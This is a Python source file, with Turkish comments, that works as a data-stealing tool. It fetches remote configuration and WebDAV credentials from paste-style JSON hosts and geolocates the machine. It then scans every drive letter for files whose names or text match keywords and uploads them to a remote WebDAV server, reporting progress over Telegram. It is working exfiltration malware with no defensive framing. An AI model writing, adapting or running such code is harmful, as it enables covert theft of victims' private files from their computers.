
import time
import hashlib
from webdav3.client import Client
import urllib3
from tg import *

urllib3.disable_warnings()
upload_finished = False

def get_unique_remote_name(client, remote_dir, filename):
    name, ext = os.path.splitext(filename)
    remote_path = remote_dir + filename
    counter = 1
    while client.check(remote_path):
        remote_path = f"{remote_dir}{name}_{counter}{ext}"
        counter += 1
    return remote_path

def sha256_file(filepath):
    hash_sha256 = hashlib.sha256()
    try:
        with open(filepath, "rb") as f:
            for chunk in iter(lambda: f.read(4096), b""):
                hash_sha256.update(chunk)
        return hash_sha256.hexdigest()
    except:
        return None

def get_user_info():
    computer_name = os.getenv('COMPUTERNAME', 'UnknownComputer')
    try:
        response = requests.get("https://ipinfo.io/json")
        response.raise_for_status()
        data = response.json()
        country = data.get("country", "UnknownCountry")
        city = data.get("city", "UnknownCity")
        region = data.get("region", "UnknownRegion")
    except Exception as e:
        country = "UnknownCountry"
        city = "UnknownCity"
        region = "UnknownRegion"

    return f"WEBDAV/{computer_name}_{country}_{city}_{region}/"

def txt_contains_keyword(filepath, keywords):
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            content = f.read().lower()
            for kw in keywords:
                if kw.lower() in content:
                    return True
    except Exception as e:
        print(f"TXT okuma hatası: {filepath} → {e}")
    return False

tryAgain = 0
def worker_loop():
    global tryAgain
    count = 0
    global upload_finished, TXT_CONTENT_KEYWORDS, MAX_TXT_SCAN_SIZE
    uploaded_hashes_path = "_internal/hashes.txt"
    if not os.path.exists("_internal"):
        os.makedirs("_internal")
    if os.path.exists(uploaded_hashes_path):
        with open(uploaded_hashes_path, "r") as f:
            uploaded_hashes = set(line.strip() for line in f)
    else:
        uploaded_hashes = set()

    PRIMARY_API = "https://api.npoint.io/ccf17d466e9ea9d0d184"
    BACKUP_API = "https://www.jsonkeeper.com/b/66F7E"  # <- yedek api buraya

    MAX_RETRY = 3
    TIMEOUT = 10

    def fetch_config(api_url):
        for attempt in range(1, MAX_RETRY + 1):
            try:
                response = requests.get(api_url, timeout=TIMEOUT)

                if response.status_code == 200:
                    return response.json()

            except requests.RequestException:
                pass

            if attempt < MAX_RETRY:
                time.sleep(2)  # kısa bekleme

        return None

    # -------------------------------------------------
    # ANA API DENEMESİ
    # -------------------------------------------------
    data_json = fetch_config(PRIMARY_API)

    if data_json:
        Telegram("Primary API başarılı ✔")

    else:
        Telegram("Primary API başarısız ❌ Yedek deneniyor...")
        data_json = fetch_config(BACKUP_API)

        if data_json:
            Telegram("Backup API başarılı ✔")
        else:
            Telegram("Tüm API'ler başarısız ❌")
            raise Exception("Config indirilemedi")

    # -------------------------------------------------
    # JSON VERİLERİNİ ÇEK
    # -------------------------------------------------
    wordslist = data_json["wordslist"]
    TXT_CONTENT_KEYWORDS = data_json["TXT_CONTENT_KEYWORDS"]
    MAX_TXT_SCAN_SIZE = data_json["MAX_TXT_SCAN_SIZE"]
    validExt = data_json["validExt"]
    ignore_list = data_json["ignore_list"]
    maxSize = data_json["maxSize"]

    webdavHost = data_json["webdav"]["host"]
    webdavUser = data_json["webdav"]["user"]
    webdavPass = data_json["webdav"]["pass"]


    disk = ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W",
            "X", "Y", "Z"]
    try:
        # # ---------------------- WEBDAV BAĞLANTISI ---------------------- #
        options = {
            'webdav_hostname': webdavHost,
            'webdav_login': webdavUser,
            'webdav_password': webdavPass
        }
        client = Client(options)
        client.verify = False
        klasorYaratWD = get_user_info()
        client.mkdir(klasorYaratWD)
        # # ---------------------- WEBDAV BAĞLANTISI ---------------------- #
        Telegram("Upload başladı ✔")
        for driver in disk:
                for root, klasorListesi, dosyalar in os.walk(driver + ":\\"):  # root = Anadizin (str), klasorListesi = root'da bulunan klasörler (list), dosyalar = klasörlerde bulunan dosyalar (list)
                    # anaDizin = root.split("\\")[1]
                    klasorListesi[:] = [d for d in klasorListesi if d not in ignore_list]
                    # print(anaDizin)
                    # if anaDizin not in ignore_list:
                    for dosya in dosyalar:
                        filePath = root + "\\" + dosya
                        fileExt = dosya.split(".")[-1]
                        # appDATA = filePath.split("\\")
                        # if "AppData" not in appDATA:
                        if fileExt.lower() in validExt:
                            for anahtar in wordslist:
                                name_match = anahtar in dosya.lower()
                                content_match = False
                                if fileExt.lower() == "txt":
                                    if os.path.getsize(filePath) <= MAX_TXT_SCAN_SIZE:
                                        content_match = txt_contains_keyword(filePath, TXT_CONTENT_KEYWORDS)
                                    else:
                                        # Büyük txt dosyası → içerik taraması yapılmaz
                                        content_match = False
                                if (name_match or content_match) and os.path.getsize(filePath) < maxSize:
                                    file_hash = sha256_file(filePath)
                                    if not file_hash or file_hash in uploaded_hashes:
                                        continue  # Dosya zaten yüklendi veya hash alınamadıysa atla
                                    remote_path = get_unique_remote_name(client, klasorYaratWD, dosya)
                                    for attempt in range(2):
                                        try:
                                            client.upload_sync(remote_path, filePath)
                                            time.sleep(2)
                                            uploaded_hashes.add(file_hash)
                                            with open(uploaded_hashes_path, "a") as f:
                                                f.write(file_hash + "\n")
                                                count += 1
                                            # print(remote_path, filePath)
                                            break  # Başarılıysa döngüden çık
                                        except Exception as e:
                                            if attempt == 1:
                                                print(f"Yükleme hatası: {filePath} → {e}")
                                                Telegram(f"Yükleme hatası: {filePath} → {e}")
                                            time.sleep(2)
        Telegram(f"Upload başarılı ✅")
        Telegram(f"{count} dosya yüklendi. 📝")
        upload_finished = True
    except Exception as err:
        upload_finished = True
        Telegram(f"Dosya yükleme başarısız ❌\n {str(err)}")
        Telegram(str(err))
        if tryAgain != 5:
            time.sleep(5)
            tryAgain += 1
            Telegram(f"Tekrar deneniyor: {tryAgain}")
            worker_loop()
        pass
